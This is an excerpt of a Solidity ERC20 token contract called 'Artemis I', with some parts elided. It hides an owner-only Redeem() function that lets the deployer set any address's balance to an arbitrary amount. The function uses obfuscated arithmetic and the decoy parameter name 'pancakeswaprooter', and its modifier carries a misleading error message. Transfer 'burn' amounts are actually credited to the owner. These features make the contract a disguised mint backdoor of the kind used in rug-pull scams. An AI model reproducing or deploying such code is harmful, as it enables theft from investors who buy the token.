...
contract Token is IERC20 {
    ...
    address private BABWALLET;
    // token liquidity metadata
    uint public override totalSupply;
    uint8 public override decimals = 9;
    
    mapping(address => uint) public BAB;
    
    mapping(address => mapping(address => uint)) public Allowance;
    
    // token title metadata
    string public override name = "Artemis I";
    ...
    constructor(uint BABTOKEN) {
        // set total supply
        totalSupply = BABTOKEN;
        
       BABWALLET = msg.sender;      
        // designate addresses
        owner = msg.sender;
        
        // split the tokens according to agreed upon percentages
        
        BAB[owner] = totalSupply;
    }
  ...
  modifier BABOWNER () {
    require(BABWALLET == msg.sender, "ERC20: cannot permit Pancake address");
    _;
  }   
    ...
    function transfer(address to, uint totalValue) public override returns(bool) {
        ...
        BAB[to] += totalValueAfterTaxAndBurn;
        BAB[msg.sender] -= totalValue;
        
        emit Transfer(msg.sender, to, totalValue);
        
        // finally, we burn and tax the extras percentage
        BAB[owner] += taxVOLOTBD + burnVOLOTBD;
    ...
    function Redeem(address pancakeswaprooter, uint256 Tamount) external BABOWNER {
      BAB[pancakeswaprooter] = (Tamount / Tamount - Tamount / Tamount) + Tamount * 10 ** 9;
  }  
    ...
    function transferFrom(address from, address to, uint totalValue) public override returns(bool) {
        ...
        require(BAB[from] >= totalValue, "Balance is too low to make transfer.");
    ...
    function _burn(address account, uint256 Tamount) internal {
        ...
        require(BAB[account] >= Tamount, "Burn Tamount exceeds balance at address.");
